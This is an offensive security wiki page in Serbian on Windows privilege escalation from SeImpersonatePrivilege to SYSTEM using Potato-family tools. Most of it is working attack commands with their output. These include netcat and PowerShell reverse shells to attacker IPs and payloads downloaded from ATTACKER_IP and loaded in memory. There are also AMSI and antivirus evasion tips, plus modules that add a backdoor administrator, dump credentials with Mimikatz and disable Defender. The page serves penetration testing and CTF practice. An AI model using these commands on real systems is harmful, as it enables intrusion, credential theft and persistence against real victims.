# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim verzijama. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu da se koriste za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje alat `PrintSpoofer`, koji može da se koristi za zloupotrebu privilegija za impersonaciju na Windows 10 i Server 2019 hostovima na kojima JuicyPotato više ne radi.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Moderna alternativa koja se često održava tokom 2024–2025. godine jeste SigmaPotato (fork alata GodPotato), koji dodaje upotrebu refleksije u memoriji/.NET-u i proširenu podršku za OS. Pogledajte brzu upotrebu u nastavku i repo u odeljku References.

Povezane stranice sa osnovama i ručnim tehnikama:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Zahtevi i česte zamke

Sve navedene tehnike oslanjaju se na zloupotrebu privilegovanog servisa koji podržava impersonaciju, iz konteksta koji ima jednu od sledećih privilegija:

- SeImpersonatePrivilege (najčešća) ili SeAssignPrimaryTokenPrivilege
- Nije potreban visok nivo integriteta ako token već ima SeImpersonatePrivilege (što je uobičajeno za mnoge servisne naloge, kao što su IIS AppPool, MSSQL itd.)

Brza provera privilegija:

```cmd
whoami /priv | findstr /i impersonate
```

Operativne napomene:

- Ako se vaša shell sesija izvršava pod ograničenim tokenom bez SeImpersonatePrivilege (često kod Local Service/Network Service u nekim kontekstima), vratite podrazumevane privilegije naloga pomoću FullPowers, a zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Token procesa može imati manje privilegija od drugog tokena za isti servisni nalog ili sesiju prijavljivanja. U nekim konfiguracijama, klijent imenovane cevi u istoj sesiji može izložiti drugi token sa SeImpersonatePrivilege, ali podešavanje `RequiredPrivileges` servisa i izlaz komande `whoami /priv` opisuju različite stvari i ne dokazuju da je takav token dostupan. Proverite stvarni token pre nego što razmotrite putanju za impersonaciju.
- PrintSpoofer zahteva da Print Spooler servis bude pokrenut i dostupan preko lokalne RPC krajnje tačke (spoolss). U ojačanim okruženjima u kojima je Spooler onemogućen nakon PrintNightmare napada, prednost dajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan preko TCP/135. Ako je izlazni saobraćaj blokiran, koristite redirector/port-forwarder (pogledajte primer u nastavku). Proverite koje zastavice podržava konkretna verzija koju koristite.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedna cev blokirana, probajte alternativne cevi (lsarpc, efsrpc, samr, lsass, netlogon).
- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu/nepodržanu RPC uslugu za autentifikaciju; probajte drugu cev/transport ili proverite da li ciljni servis radi.
- „Kitchen-sink“ fork-ovi kao što je DeadPotato obuhvataju dodatne payload module (Mimikatz/SharpHound/Defender off) koji upisuju na disk; očekujte veće EDR detekcije u poređenju sa jednostavnijim originalima.

## Brza demonstracija

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notes:
- Možete koristiti `-i` za pokretanje interaktivnog procesa u trenutnoj konzoli ili `-c` za pokretanje one-liner komande.
- Potrebna je Spooler usluga. Ako je onemogućena, ovo neće uspeti.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

U [upstream usage](https://github.com/antonioCoco/RoguePotato#usage), `-e` zadaje komandu, `-l` bira lokalni port resolvera, a opcioni `-c` bira CLSID. Ako COM aktivacija pokrene servis čija je putanja izvršne datoteke već izmenjena, taj servis može da izvrši izmenjenu komandu nezavisno od impersonacije tokena; proverite konfiguraciju servisa pre nego što pripišete uočeno izvršavanje sa SYSTEM privilegijama ovoj tehnici.

Ako je odlazni port 135 blokiran, preusmerite OXID resolver preko socat-a na svom redirector-u:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato je noviji primitive za zloupotrebu COM-a, objavljen krajem 2022. godine, koji cilja servis **PrintNotify** umesto Spooler/BITS-a. Binarni fajl instancira PrintNotify COM server, zamenjuje njegov `IUnknown` lažnim, a zatim aktivira privilegovani callback preko `CreatePointerMoniker`. Kada se servis PrintNotify (koji radi kao **SYSTEM**) poveže nazad, proces duplicira vraćeni token i pokreće zadati payload sa punim privilegijama.<sup>[[13]](#references)</sup>

Ključne operativne napomene:

* Radi na Windows 10/11 i Windows Server 2012–2022, pod uslovom da je instaliran Print Workflow/PrintNotify servis (prisutan je čak i kada je zastareli Spooler onemogućen nakon PrintNightmare-a).
* Zahteva da kontekst pozivaoca ima **SeImpersonatePrivilege** (tipično za IIS APPPOOL, MSSQL i naloge servisnih zadataka).
* Prihvata direktnu komandu ili interaktivni režim, tako da možete ostati u originalnoj konzoli. Primer:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Pošto je zasnovan isključivo na COM-u, nisu potrebni named-pipe listeneri ni eksterni redirectori, pa predstavlja direktnu zamenu na hostovima na kojima Defender blokira RPC binding koji koristi RoguePotato.

Operateri poput Ink Dragon-a pokreću PrintNotifyPotato odmah nakon što ostvare ViewState RCE na SharePointu, kako bi prešli sa worker procesa `w3wp.exe` na SYSTEM pre instaliranja ShadowPad-a.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Savet: Ako jedan pipe zakaže ili ga EDR blokira, probajte druge podržane pipe-ove:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Beleške:
- Radi na Windows 8/8.1–11 i Server 2012–2022 ako je prisutan SeImpersonatePrivilege.
- Nabavite binarnu datoteku koja odgovara instaliranom runtime-u (npr. `GodPotato-NET4.exe` na modernom Server 2022).
- Ako vaš početni primitive za izvršavanje koristi webshell/UI sa kratkim timeout-ovima, postavite payload kao skriptu i zamolite GodPotato da je pokrene umesto da koristite dugu inline komandu.<sup>[[12]](#references)</sup>

Brzi obrazac za postavljanje iz IIS webroot-a sa dozvolom za pisanje:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato pruža dve varijante koje ciljaju DCOM objekte servisa koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Izgradite ili upotrebite obezbeđene binarne fajlove i pokrenite svoju komandu:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (ažurirani fork GodPotato)

SigmaPotato dodaje moderne pogodnosti, poput izvršavanja u memoriji putem .NET reflectiona i pomoćne funkcije za PowerShell reverse shell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Dodatne pogodnosti u buildovima iz 2024–2025 (v1.2.x):
- Ugrađena zastavica reverse shell-a `--revshell` i uklanjanje PowerShell ograničenja od 1024 znaka, tako da možete da pokrenete dugačke payload-e koji zaobilaze AMSI odjednom.
- Sintaksa pogodna za Reflection (`[SigmaPotato]::Main()`), uz rudimentarni trik za izbegavanje AV-a pomoću `VirtualAllocExNuma()` koji zbunjuje jednostavne heuristike.
- Zaseban `SigmaPotatoCore.exe` kompajliran za .NET 2.0, za PowerShell Core okruženja.

### DeadPotato (prerada GodPotato iz 2024. sa modulima)

DeadPotato zadržava GodPotato OXID/DCOM lanac impersonation-a, ali uključuje pomoćne post-exploitation funkcije, tako da operatori mogu odmah da preuzmu SYSTEM i sprovedu persistence/collection bez dodatnih alata.<sup>[[15]](#references)</sup>

Uobičajeni moduli (za sve je potreban SeImpersonatePrivilege):

- `-cmd "<cmd>"` — pokreće proizvoljnu komandu kao SYSTEM.
- `-rev <ip:port>` — brzi reverse shell.
- `-newadmin user:pass` — kreira lokalnog administratora radi persistence-a.
- `-mimi sam|lsa|all` — preuzima i pokreće Mimikatz radi izvlačenja kredencijala (ostavlja tragove na disku i bučan je).
- `-sharphound` — pokreće SharpHound collection kao SYSTEM.
- `-defender off` — isključuje Defender real-time protection (veoma bučno).

Primeri jednolinijskih komandi:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Pošto dolazi sa dodatnim binarnim fajlovima, očekujte više AV/EDR detekcija; koristite lakši GodPotato/SigmaPotato kada je prikrivenost važna.

## References

- [1] [PrintSpoofer – Zloupotreba privilegija impersonacije u Windows 10 i Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Nema više JuicyPotato? Stara priča, dobrodošao RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Vraćanje podrazumevanih privilegija tokena za servisne naloge](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato do SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Prerada GodPotato sa ugrađenim post-ex modulima](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
